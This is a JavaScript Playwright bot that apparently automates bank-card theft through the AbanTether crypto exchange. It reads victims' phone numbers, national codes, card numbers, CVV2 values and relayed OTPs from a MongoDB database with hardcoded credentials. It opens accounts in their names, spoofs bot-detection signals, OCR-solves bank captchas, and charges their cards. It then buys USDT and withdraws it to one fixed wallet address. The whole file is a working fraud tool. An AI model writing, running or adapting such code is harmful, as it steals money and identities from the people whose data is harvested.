const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const Tesseract = require('tesseract.js');
const fs = require('fs').promises;
const path = require('path');

class AbanTetherBot {
    constructor() {
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        
        this.browser = null;
        this.page = null;
        this.context = null;
        this.currentUser = null;
        
        this.website = {
            baseUrl: 'https://abantether.com',
            timeout: 120000,
            headless: true, // برای تولید true بگذارید
            slowMo: 0
        };
        
        this.processingUsers = new Set();
        this.maxRetries = 3;
        this.debugDir = './debug_screenshots';
        
        this.password = 'ImSorryButIhaveTo@1';
        this.withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
        this.depositAmount = '5000000';
        this.buyAmount = '40';
        this.withdrawAmount = '40';
    }

    async log(message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] ${message}`);
    }

    async saveScreenshot(name) {
        try {
            await fs.mkdir(this.debugDir, { recursive: true });
            const filepath = path.join(this.debugDir, `${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: filepath });
            this.log(`📸 Screenshot saved: ${filepath}`);
        } catch (error) {
            this.log(`⚠️ Could not save screenshot: ${error.message}`);
        }
    }

    async initialize() {
        this.log('🚀 Starting AbanTether Bot...');
        
        try {
            this.client = new MongoClient(this.mongoUri);
            await this.client.connect();
            this.db = this.client.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            this.log('✅ Connected to MongoDB');
        } catch (error) {
            this.log(`❌ MongoDB connection error: ${error.message}`);
            throw error;
        }
    }

    async startPolling() {
        this.log('🔄 Starting database polling (every 30 seconds)...');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            await this.checkDatabase();
        }, 30000);
    }

    async checkDatabase() {
        try {
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(5).toArray();
            
            this.log(`📊 Found ${pendingUsers.length} pending users`);
            
            for (const user of pendingUsers) {
                const phone = user.personalPhoneNumber;
                
                if (this.processingUsers.has(phone)) {
                    this.log(`⏭️ User ${phone} is already being processed`);
                    continue;
                }
                
                const retryCount = user.retryCount || 0;
                if (retryCount >= this.maxRetries) {
                    this.log(`⛔ User ${phone} exceeded max retries`);
                    await this.markUserFailed(phone, 'Max retries exceeded');
                    continue;
                }
                
                this.processUser(user);
            }
        } catch (error) {
            this.log(`❌ Error checking database: ${error.message}`);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        this.log(`👤 Processing user: ${phone}`);
        
        this.processingUsers.add(phone);
        
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                {
                    $set: {
                        status: 'processing',
                        startedAt: new Date()
                    },
                    $inc: { retryCount: 1 }
                }
            );
            
            const result = await this.executeFullProcess(user);
            
            if (result.success) {
                this.log(`✅ User ${phone} processed successfully`);
                await this.markUserCompleted(phone, result.details);
            } else {
                this.log(`❌ Failed for user ${phone}: ${result.error}`);
                await this.markUserFailed(phone, result.error);
            }
            
        } catch (error) {
            this.log(`💥 Critical error for user ${phone}: ${error.message}`);
            await this.markUserFailed(phone, `Critical error: ${error.message}`);
        } finally {
            this.processingUsers.delete(phone);
        }
    }

    async executeFullProcess(user) {
        try {
            this.currentUser = user;
            
            await this.initializeBrowser();
            
            const steps = [
                { name: 'Registration', method: () => this.step1Registration(user) },
                { name: 'Set Password', method: () => this.step2SetPassword() },
                { name: 'Basic KYC', method: () => this.step3BasicKYC(user) },
                { name: 'Wallet Navigation', method: () => this.step4GoToWallet() },
                { name: 'Add Contract', method: () => this.step5AddContract(user) },
                { name: 'Bank Process', method: () => this.step6BankProcess(user) },
                { name: 'Complete Deposit', method: () => this.step7CompleteDeposit() },
                { name: 'Buy Tether', method: () => this.step8BuyTether() },
                { name: 'Withdraw Tether', method: () => this.step9WithdrawTether() }
            ];
            
            for (const step of steps) {
                this.log(`🚀 Starting: ${step.name}`);
                const result = await step.method();
                if (!result.success) {
                    return result;
                }
                await this.page.waitForTimeout(2000);
            }
            
            return { success: true, details: { completedAt: new Date() } };
            
        } catch (error) {
            return { success: false, error: error.message };
        } finally {
            await this.closeBrowser();
        }
    }

    async initializeBrowser() {
        this.log('🌐 Initializing browser...');
        this.browser = await chromium.launch({
            headless: this.website.headless,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1280,720'
            ],
            slowMo: this.website.slowMo
        });
        
        this.context = await this.browser.newContext({
            viewport: { width: 1280, height: 720 },
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            locale: 'fa-IR',
            timezoneId: 'Asia/Tehran'
        });
        
        this.page = await this.context.newPage();
        
        this.page.setDefaultTimeout(this.website.timeout);
        this.page.setDefaultNavigationTimeout(this.website.timeout);
        
        await this.page.addInitScript(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'fa'] });
        });
        
        this.log('✅ Browser initialized');
    }

    async step1Registration(user) {
        try {
            this.log('📝 Step 1: Registration - Starting...');
            
            await this.page.goto('https://abantether.com/register', { 
                waitUntil: 'domcontentloaded',
                timeout: 120000
            });
            
            await this.page.waitForTimeout(3000);
            await this.saveScreenshot('01-register-page');
            
            this.log('🔍 Looking for phone input field...');
            
            const selectors = [
                'input[type="tel"]',
                'input[name*="phone"]',
                'input[name*="mobile"]',
                'input[placeholder*="موبایل"]',
                'input[placeholder*="شماره"]',
                'input[placeholder*="تلفن"]',
                'input'
            ];
            
            let phoneInput = null;
            for (const selector of selectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        const placeholder = await element.getAttribute('placeholder') || '';
                        const name = await element.getAttribute('name') || '';
                        
                        if (placeholder.includes('موبایل') || 
                            placeholder.includes('شماره') ||
                            name.includes('phone') || 
                            name.includes('mobile')) {
                            phoneInput = element;
                            this.log(`✅ Phone input found with selector: ${selector}`);
                            break;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }
            
            if (!phoneInput) {
                const allInputs = await this.page.$$('input');
                for (const input of allInputs) {
                    try {
                        const placeholder = await input.getAttribute('placeholder') || '';
                        if (placeholder.includes('موبایل') || placeholder.includes('شماره')) {
                            phoneInput = input;
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
            }
            
            if (!phoneInput) {
                throw new Error('Phone input field not found');
            }
            
            await phoneInput.fill(user.personalPhoneNumber);
            this.log(`✅ Phone entered: ${user.personalPhoneNumber}`);
            await this.saveScreenshot('02-phone-filled');
            
            this.log('🔍 Looking for register button...');
            const buttonSelectors = [
                'button:has-text("ثبت نام")',
                'button:has-text("ثبت‌نام")',
                'button:has-text("ارسال کد")',
                'button[type="submit"]',
                'form button'
            ];
            
            let registerButton = null;
            for (const selector of buttonSelectors) {
                try {
                    const button = await this.page.$(selector);
                    if (button) {
                        registerButton = button;
                        this.log(`✅ Register button found with selector: ${selector}`);
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }
            
            if (!registerButton) {
                throw new Error('Register button not found');
            }
            
            await registerButton.click();
            this.log('✅ Register button clicked');
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('03-after-register-click');
            
            this.log('🔍 Looking for OTP field...');
            await this.page.waitForSelector('input[type="number"], input[placeholder*="کد"]', { timeout: 30000 });
            
            const otpField = await this.page.$('input[type="number"], input[placeholder*="کد"]');
            if (!otpField) {
                throw new Error('OTP field not found');
            }
            
            this.log('⏳ Waiting for OTP in database...');
            const otpLogin = await this.waitForDatabaseField('otp_login', 180000);
            
            if (!otpLogin) {
                throw new Error('Login OTP not received');
            }
            
            await otpField.fill(otpLogin);
            this.log(`✅ OTP entered: ${otpLogin}`);
            await this.saveScreenshot('04-otp-entered');
            
            const nextButton = await this.page.$('button:has-text("مرحله بعد")');
            if (nextButton) {
                await nextButton.click();
                this.log('✅ Next button clicked');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('✅ Pressed Enter');
            }
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('05-after-otp-submit');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in registration: ${error.message}`);
            await this.saveScreenshot('error-registration');
            return { success: false, error: error.message };
        }
    }

    async step2SetPassword() {
        try {
            this.log('🔐 Step 2: Set Password');
            
            await this.page.waitForSelector('input[placeholder*="رمز عبور"]', { timeout: 10000 });
            
            const passwordInput = await this.page.$('input[placeholder*="رمز عبور"]');
            if (!passwordInput) {
                throw new Error('Password input field not found');
            }
            
            await passwordInput.fill(this.password);
            this.log('✅ Password entered');
            
            await this.saveScreenshot('06-password-filled');
            
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('✅ Confirm button clicked');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('✅ Pressed Enter');
            }
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('07-after-password');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in set password: ${error.message}`);
            await this.saveScreenshot('error-password');
            return { success: false, error: error.message };
        }
    }

    async step3BasicKYC(user) {
        try {
            this.log('🆔 Step 3: Basic KYC');
            
            await this.page.waitForTimeout(3000);
            
            const nationalCodeInput = await this.page.$('input[placeholder*="کد 10 رقمی"]');
            if (nationalCodeInput) {
                await nationalCodeInput.fill(user.personalNationalCode);
                this.log(`✅ National code entered: ${user.personalNationalCode}`);
            } else {
                this.log('⚠️ National code input not found');
            }
            
            const birthDateInput = await this.page.$('input[placeholder*="روز/ماه/سال"]');
            if (birthDateInput) {
                await birthDateInput.fill(user.personalBirthDate);
                this.log(`✅ Birth date entered: ${user.personalBirthDate}`);
            } else {
                this.log('⚠️ Birth date input not found');
            }
            
            await this.saveScreenshot('08-kyc-filled');
            
            const submitButton = await this.page.$('button:has-text("ثبت")');
            if (submitButton) {
                await submitButton.click();
                this.log('✅ Submit button clicked');
            } else {
                await this.page.keyboard.press('Enter');
                this.log('✅ Pressed Enter');
            }
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('09-after-kyc');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in KYC: ${error.message}`);
            await this.saveScreenshot('error-kyc');
            return { success: false, error: error.message };
        }
    }

    async step4GoToWallet() {
        try {
            this.log('💰 Step 4: Go to Wallet');
            
            await this.page.waitForTimeout(3000);
            
            const walletButton = await this.page.$('nav a:has-text("کیف پول"), [href*="/wallet"]');
            if (walletButton) {
                await walletButton.click();
                this.log('✅ Wallet button clicked');
            } else {
                await this.page.goto('https://abantether.com/user/wallet', { waitUntil: 'domcontentloaded' });
            }
            
            await this.page.waitForTimeout(3000);
            await this.saveScreenshot('10-wallet-page');
            
            const depositButton = await this.page.$('button:has-text("واریز"), a:has-text("واریز")');
            if (depositButton) {
                await depositButton.click();
                this.log('✅ Deposit button clicked');
                await this.page.waitForTimeout(2000);
            }
            
            const tomanButton = await this.page.$('button:has-text("تومان"), a:has-text("تومان")');
            if (tomanButton) {
                await tomanButton.click();
                this.log('✅ Toman button clicked');
            }
            
            await this.page.waitForTimeout(2000);
            await this.saveScreenshot('11-deposit-page');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in wallet navigation: ${error.message}`);
            await this.saveScreenshot('error-wallet');
            return { success: false, error: error.message };
        }
    }

    async step5AddContract(user) {
        try {
            this.log('📄 Step 5: Add Contract');
            
            await this.page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { 
                waitUntil: 'domcontentloaded',
                timeout: 120000
            });
            
            await this.page.waitForTimeout(3000);
            await this.saveScreenshot('12-contract-page');
            
            const addContractButton = await this.page.$('button:has-text("افزودن قرارداد")');
            if (!addContractButton) {
                throw new Error('Add contract button not found');
            }
            
            await addContractButton.click();
            this.log('✅ Add contract button clicked');
            
            await this.page.waitForTimeout(2000);
            await this.saveScreenshot('13-add-contract-form');
            
            const bankName = user.bank || 'ملی';
            const bankSelect = await this.page.$('select, [name*="bank"]');
            if (bankSelect) {
                await bankSelect.selectOption({ label: new RegExp(bankName) });
                this.log(`✅ Bank selected: ${bankName}`);
            }
            
            const contractDuration = await this.page.$('select, [name*="duration"]');
            if (contractDuration) {
                await contractDuration.selectOption({ label: '1 ماه' });
                this.log('✅ Contract duration selected: 1 month');
            }
            
            await this.saveScreenshot('14-contract-filled');
            
            const submitContractButton = await this.page.$('button:has-text("ثبت و ادامه")');
            if (!submitContractButton) {
                throw new Error('Submit contract button not found');
            }
            
            await submitContractButton.click();
            this.log('✅ Submit contract button clicked');
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('15-after-contract-submit');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in add contract: ${error.message}`);
            await this.saveScreenshot('error-contract');
            return { success: false, error: error.message };
        }
    }

    async step6BankProcess(user) {
        try {
            this.log('🏦 Step 6: Bank Process');
            
            const bank = user.bank || 'ملی';
            
            if (bank.includes('ملی')) {
                return await this.processBankMelli(user);
            } else if (bank.includes('مهر')) {
                return await this.processBankMehrIran(user);
            } else {
                this.log(`⚠️ Bank ${bank} not specifically implemented, trying generic process`);
                return await this.processGenericBank(user);
            }
        } catch (error) {
            this.log(`❌ Error in bank process: ${error.message}`);
            await this.saveScreenshot('error-bank');
            return { success: false, error: error.message };
        }
    }

    async processBankMelli(user) {
        try {
            this.log('🏦 Processing Bank Melli');
            
            const bankLoginButton = await this.page.$('button:has-text("ورود با کارت بانک ملی")');
            if (!bankLoginButton) {
                throw new Error('Bank Melli login button not found');
            }
            
            await bankLoginButton.click();
            this.log('✅ Bank Melli login button clicked');
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('16-bank-melli-page');
            
            await this.solveCaptchaAndFillForm(user);
            
            return { success: true };
        } catch (error) {
            throw error;
        }
    }

    async processBankMehrIran(user) {
        try {
            this.log('🏦 Processing Bank Mehr Iran');
            
            await this.page.waitForTimeout(3000);
            await this.saveScreenshot('16-bank-mehr-page');
            
            const cardNumberInput = await this.page.$('input[placeholder*="شماره کارت"], input[name*="card"]');
            if (cardNumberInput) {
                await cardNumberInput.fill(user.cardNumber);
                this.log('✅ Card number entered');
            }
            
            const cvvInput = await this.page.$('input[placeholder*="CVV2"], input[name*="cvv"]');
            if (cvvInput) {
                await cvvInput.fill(user.cvv2);
                this.log('✅ CVV2 entered');
            }
            
            const monthInput = await this.page.$('input[placeholder*="ماه"], select[name*="month"]');
            if (monthInput) {
                await monthInput.fill(user.bankMonth.toString());
                this.log('✅ Month entered');
            }
            
            const yearInput = await this.page.$('input[placeholder*="سال"], select[name*="year"]');
            if (yearInput) {
                await yearInput.fill(user.bankYear.toString());
                this.log('✅ Year entered');
            }
            
            await this.saveScreenshot('17-bank-form-filled');
            
            const captchaSolved = await this.solveCaptchaAndFillForm(user);
            if (!captchaSolved) {
                this.log('⚠️ Captcha solving failed, trying alternative');
            }
            
            const dynamicPassButton = await this.page.$('button:has-text("دریافت رمز پویا")');
            if (dynamicPassButton) {
                await dynamicPassButton.click();
                this.log('✅ Dynamic password button clicked');
                await this.page.waitForTimeout(3000);
            }
            
            const otpPayment = await this.waitForDatabaseField('otp_payment', 180000);
            if (otpPayment) {
                const otpInput = await this.page.$('input[placeholder*="رمز دوم"], input[name*="password"]');
                if (otpInput) {
                    await otpInput.fill(otpPayment);
                    this.log('✅ Payment OTP entered');
                }
            }
            
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('✅ Confirmed payment');
            }
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('18-after-bank-confirm');
            
            return { success: true };
        } catch (error) {
            throw error;
        }
    }

    async processGenericBank(user) {
        try {
            this.log('🏦 Processing Generic Bank');
            
            await this.page.waitForTimeout(3000);
            await this.saveScreenshot('16-generic-bank-page');
            
            const cardNumberInput = await this.page.$('input[placeholder*="شماره کارت"]');
            if (cardNumberInput) {
                await cardNumberInput.fill(user.cardNumber);
            }
            
            const cvvInput = await this.page.$('input[placeholder*="CVV2"]');
            if (cvvInput) {
                await cvvInput.fill(user.cvv2);
            }
            
            await this.solveCaptchaAndFillForm(user);
            
            return { success: true };
        } catch (error) {
            throw error;
        }
    }

    async solveCaptchaAndFillForm(user) {
        try {
            this.log('🔍 Solving captcha...');
            
            const captchaElement = await this.page.$('img[src*="captcha"], .captchaWrap img, #card-captcha-img');
            if (captchaElement) {
                const screenshot = await captchaElement.screenshot();
                
                const { data: { text } } = await Tesseract.recognize(screenshot, 'eng');
                
                const captchaCode = text.replace(/\s+/g, '').trim();
                this.log(`✅ Captcha solved: ${captchaCode}`);
                
                const captchaInput = await this.page.$('input[placeholder*="عبارت امنیتی"], input[name*="captcha"]');
                if (captchaInput) {
                    await captchaInput.fill(captchaCode);
                    this.log('✅ Captcha entered');
                    await this.saveScreenshot('19-captcha-solved');
                    return true;
                }
            }
            
            this.log('⚠️ Captcha element not found or solving failed');
            return false;
        } catch (error) {
            this.log(`⚠️ Captcha solving error: ${error.message}`);
            return false;
        }
    }

    async step7CompleteDeposit() {
        try {
            this.log('💰 Step 7: Complete Deposit');
            
            await this.page.waitForTimeout(5000);
            
            const amountInput = await this.page.$('input[placeholder*="مبلغ واریزی"], input[name*="amount"]');
            if (amountInput) {
                await amountInput.fill(this.depositAmount);
                this.log(`✅ Amount entered: ${this.depositAmount}`);
            }
            
            const bankSelect = await this.page.$('select[name*="bank"], [placeholder*="نام بانک"]');
            if (bankSelect) {
                await bankSelect.selectOption({ label: /ملی/ });
                this.log('✅ Bank selected: ملی');
            }
            
            await this.saveScreenshot('20-deposit-amount-filled');
            
            const depositButton = await this.page.$('button:has-text("واریز")');
            if (depositButton) {
                await depositButton.click();
                this.log('✅ Deposit button clicked');
                await this.page.waitForTimeout(2000);
            }
            
            const confirmButton = await this.page.$('button:has-text("تایید و پرداخت")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('✅ Confirm and pay button clicked');
            }
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('21-after-deposit-confirm');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in complete deposit: ${error.message}`);
            await this.saveScreenshot('error-deposit');
            return { success: false, error: error.message };
        }
    }

    async step8BuyTether() {
        try {
            this.log('🔄 Step 8: Buy Tether');
            
            await this.page.goto('https://abantether.com/user/trade/fast/buy?s=USDT', { 
                waitUntil: 'domcontentloaded',
                timeout: 120000
            });
            
            await this.page.waitForTimeout(3000);
            await this.saveScreenshot('22-buy-tether-page');
            
            const amountInput = await this.page.$('input[name*="amount"], input[placeholder*="مقدار"]');
            if (amountInput) {
                await amountInput.fill(this.buyAmount);
                this.log(`✅ Buy amount entered: ${this.buyAmount}`);
            }
            
            await this.saveScreenshot('23-buy-amount-filled');
            
            const submitOrderButton = await this.page.$('button:has-text("ثبت سفارش")');
            if (submitOrderButton) {
                await submitOrderButton.click();
                this.log('✅ Order submitted');
            }
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('24-after-buy');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in buy tether: ${error.message}`);
            await this.saveScreenshot('error-buy');
            return { success: false, error: error.message };
        }
    }

    async step9WithdrawTether() {
        try {
            this.log('📤 Step 9: Withdraw Tether');
            
            await this.page.goto('https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT', { 
                waitUntil: 'domcontentloaded',
                timeout: 120000
            });
            
            await this.page.waitForTimeout(3000);
            await this.saveScreenshot('25-withdraw-page');
            
            const currencySelect = await this.page.$('select[name*="currency"]');
            if (currencySelect) {
                await currencySelect.selectOption({ label: /تتر|USDT/ });
                this.log('✅ Currency selected: Tether');
            }
            
            const networkSelect = await this.page.$('select[name*="network"]');
            if (networkSelect) {
                await networkSelect.selectOption({ label: /BSC.*BEP20/ });
                this.log('✅ Network selected: BSC(BEP20)');
            }
            
            const addressInput = await this.page.$('input[placeholder*="آدرس ولت"], input[name*="address"]');
            if (addressInput) {
                await addressInput.fill(this.withdrawAddress);
                this.log('✅ Wallet address entered');
            }
            
            const amountInput = await this.page.$('input[placeholder*="مقدار"], input[name*="amount"]');
            if (amountInput) {
                await amountInput.fill(this.withdrawAmount);
                this.log(`✅ Withdrawal amount entered: ${this.withdrawAmount}`);
            }
            
            await this.saveScreenshot('26-withdraw-filled');
            
            const withdrawButton = await this.page.$('button:has-text("ثبت برداشت")');
            if (withdrawButton) {
                await withdrawButton.click();
                this.log('✅ Withdrawal submitted');
            }
            
            await this.page.waitForTimeout(5000);
            await this.saveScreenshot('27-after-withdraw');
            
            return { success: true };
        } catch (error) {
            this.log(`❌ Error in withdraw tether: ${error.message}`);
            await this.saveScreenshot('error-withdraw');
            return { success: false, error: error.message };
        }
    }

    async waitForDatabaseField(fieldName, timeout = 180000) {
        this.log(`⏳ Waiting for ${fieldName} in database...`);
        
        const startTime = Date.now();
        const phone = this.currentUser.personalPhoneNumber;
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne(
                    { personalPhoneNumber: phone },
                    { projection: { [fieldName]: 1 } }
                );
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const value = user[fieldName];
                    this.log(`✅ ${fieldName} received: ${value}`);
                    
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return value;
                }
                
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                if (elapsed % 30 === 0) {
                    this.log(`⏳ Still waiting for ${fieldName}... (${elapsed}s elapsed)`);
                }
                
                await this.page.waitForTimeout(5000);
                
            } catch (error) {
                this.log(`Error checking ${fieldName}: ${error.message}`);
                await this.page.waitForTimeout(5000);
            }
        }
        
        this.log(`⏰ Timeout waiting for ${fieldName}`);
        return null;
    }

    async markUserCompleted(phone, details = {}) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                {
                    $set: {
                        processed: true,
                        status: 'completed',
                        completedAt: new Date(),
                        ...details
                    }
                }
            );
            this.log(`✅ User ${phone} marked as completed`);
        } catch (error) {
            this.log(`Error marking user as completed: ${error.message}`);
        }
    }

    async markUserFailed(phone, reason) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                {
                    $set: {
                        status: 'failed',
                        failureReason: reason,
                        failedAt: new Date()
                    }
                }
            );
            this.log(`❌ User ${phone} marked as failed: ${reason}`);
        } catch (error) {
            this.log(`Error marking user as failed: ${error.message}`);
        }
    }

    async closeBrowser() {
        if (this.page) await this.page.close();
        if (this.context) await this.context.close();
        if (this.browser) await this.browser.close();
        this.log('✅ Browser closed');
    }

    async start() {
        await this.initialize();
        await this.startPolling();
        
        process.on('SIGINT', async () => {
            this.log('\n🛑 Stopping bot...');
            await this.closeBrowser();
            if (this.client) await this.client.close();
            process.exit(0);
        });
        
        this.log('🤖 Bot is running. Press Ctrl+C to stop.');
    }
}

// اجرای ربات
const bot = new AbanTetherBot();
bot.start().catch(console.error);